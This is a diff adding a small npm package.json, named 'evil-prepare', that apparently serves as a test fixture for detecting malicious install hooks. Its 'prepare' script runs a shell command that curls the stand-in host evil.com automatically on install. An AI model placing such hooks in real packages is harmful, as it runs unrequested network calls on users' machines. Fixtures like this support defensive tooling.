@@ -1,0 +1,7 @@
+{
+  "name": "evil-prepare",
+  "version": "1.0.0",
+  "scripts": {
+    "prepare": "node -e 'require(\"child_process\").execSync(\"curl evil.com\")'"
+  }
+}
